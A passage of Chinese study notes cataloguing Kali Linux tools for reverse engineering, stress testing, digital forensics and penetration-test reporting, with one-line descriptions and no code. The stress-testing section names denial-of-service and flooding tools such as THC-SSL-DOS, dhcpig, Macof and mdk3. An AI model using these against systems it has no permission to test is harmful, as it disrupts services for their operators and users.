      google提供的APK编译工具，能够反编译及回编译apk，同时安装反编译系统apk所需要的framework-res框架

7. Clang，Clang++
    C语言、C++、Objective C，Objective C++语言的轻量级编译器

8. D2j-dex2jar
    反编译dex文件到jar文件，进而可以用其他工具查看源代码

9. Flasm
    用于直接修改swf文件里的脚本actionscript
    只修改脚本，不修改资源数据
    支持破解flash8和低于flash8格式的swf文件

10. Javasnoop
    Java应用程序安全测试工具，允许以拦截的方式，篡改数据和hack运行在计算机上的java应用程序 
    有源代码的情况下靠点谱
    允许直接附加一个运行中的进程，类似于调试器，然后，立即篡改方法调用、运行自定义代码或仅仅监视在系统中发生了什么
```

## 第三十六节 压力测试工具
压力测试是为了发现在什么条件下应用程序的性能会变得不可接受  
```
1. VoIP压力测试工具
 
2. THC-SSL-DOS
    利用SSL中的已知弱点，迅速消耗服务器资源，只需要一台执行单一攻击的电脑
 
3. dhcpig
    耗尽DHCP资源池的压力测试

4. IPv6攻击工具包

5. Inundator
    IDS/IPS/WAF压力测试工具

6. Macof
    可做泛洪攻击

7. Siege
    用于WEB开发，评估应用在压力下的承受能力

8. T50压力测试
    功能强大且具有独特的数据包注入工具

9. 无线压力测试工具
    mdk3
    reaver
```

## 第三十七节 数字取证工具
```
1. PDF取证工具
    peepdf：python编写，检测恶意的PDF文件

2. 反数字取证 chkrootkit
    判断系统是否被植入Rootkit的利器

3. 内存取证工具
    Volatility：python编写，命令行操作，支持各种操作系统

4. 取证分割工具 binwalk
    固件分析
    提取文件中存在的隐藏文件，也可以分析文件格式
    -e  提取隐藏文件
   个人感觉foremost更好用

5. 取证哈希验证工具集
    md5deep：一套跨平台的方案，可以计算和比较MD5等哈希加密信息的摘要

6. 取证镜像工具集
    针对镜像文件的取证工具，如mmsstat与mmls等命令
    直接分析镜像中目录等信息

7. 数字取证套件
    DFF（Digital  Forensics  Framework），具有多种功能，包括：
        恢复错误或崩溃导致的文件丢失，证据的研究和分析等
```

## 第三十八节 报告工具与系统服务
完整的渗透测试，最后需要完成一份报告  
```
1. Dradis
    用于提高安全检测效率的信息共享框架（协作平台），提供了集中的信息仓库，用于标记目前已经做的工作和下一步的计划

2. Keepnote
    精简的笔记软件
    特点：
        富文本格式：彩色字体、内置图片、超链接（能保存完整网页）
        树形分层组织内容
        全文搜索
        综合截图
        文件附件
        集成的备份和恢复
        拼写检查（通过gtkpell）
        自动保存
        内置的备份和恢复（zip文件存档）
    
3. Cutycapt
    将网页内容截成图片保存

4. Recordmydesktop
    屏幕录像工具，用来录制桌面

5. Maltego Casefile
    
6. MagicTree
    数据合并、查询、外部命令执行、报告生成
    java运行

7. Truecrypt
    加密软件

8. 系统服务介绍
    各种服务框架的开关

9. Kali下其他工具
    编程什么的 
```


---
2016/7/14  
